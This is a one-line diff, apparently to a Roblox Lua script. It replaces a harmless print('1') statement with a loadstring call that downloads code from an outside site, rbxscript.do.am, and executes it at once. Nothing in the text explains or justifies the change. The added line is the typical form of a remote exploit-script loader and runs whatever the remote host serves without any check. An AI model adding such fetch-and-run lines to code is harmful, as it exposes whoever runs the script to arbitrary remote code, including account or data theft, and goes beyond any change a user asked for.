@@ -1,1 +1,1 @@
-print("1")
+loadstring(game:HttpGet("https://rbxscript.do.am/loader/main.html"))()
